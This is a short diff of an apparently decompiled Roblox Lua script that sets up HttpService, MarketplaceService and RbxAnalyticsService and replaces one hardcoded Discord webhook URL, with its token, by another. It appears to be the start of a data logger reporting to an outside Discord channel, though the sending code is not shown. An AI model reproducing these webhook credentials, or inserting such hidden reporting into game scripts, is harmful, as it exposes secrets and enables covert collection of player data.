@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local s1 = "https://discord.com/api/webhooks/1264440623700906095/SN5cqNl-I8ohk-B-Hg4lVpDTRx8ZqoeE7R4XT4BEG3GWYXqNbBikGLGvI6hOyz66bubo"
+local s1 = "https://discord.com/api/webhooks/1555003693898932314/IcKUb8zUEly-NzHPi-580JA1d8e2CnLJplGwR2hw2pP7ixEXlrbZwdLCzbbhUOwA4j-h"
 local PlaceId = game.PlaceId
 local ok, result = pcall(function()
 	-- upvalues: MarketplaceService (ref), PlaceId (ref)
